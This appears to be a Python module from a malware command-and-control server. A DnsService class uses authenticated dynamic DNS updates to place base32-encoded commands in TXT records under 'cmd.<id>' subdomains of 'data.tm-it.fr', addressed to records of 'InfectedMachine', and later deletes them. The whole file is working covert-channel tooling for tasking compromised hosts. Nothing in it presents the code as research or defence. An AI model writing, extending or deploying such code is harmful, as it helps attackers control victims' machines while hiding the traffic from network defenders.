import base64
import os
from typing import Self

import dns
import dns.query
from dns import tsigkeyring
from dns.update import Update

from djangoproject.models import InfectedMachine


class DnsService:
    def __init__(self):
        key_name = os.environ.get('DNS_ZONE_KEY_NAME', '')
        self.keyring = tsigkeyring.from_text({
            key_name: os.environ.get('DNS_ZONE_KEY'),
        })
        self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))

    def set_job_txt(self, machine: InfectedMachine, txt_value: str) -> Self:
        # Replace does create the record if not exists, or update the value
        self.updater.replace(f'cmd.{machine.dns_identifier}', 300, "TXT", base64.b32encode(txt_value.encode()).decode())
        return self

    def remove_job_txt(self, machine: InfectedMachine) -> Self:
        self.updater.delete(f'cmd.{machine.dns_identifier}')
        return self

    def apply(self):
        dns.query.tcp(self.updater, "127.0.0.1")
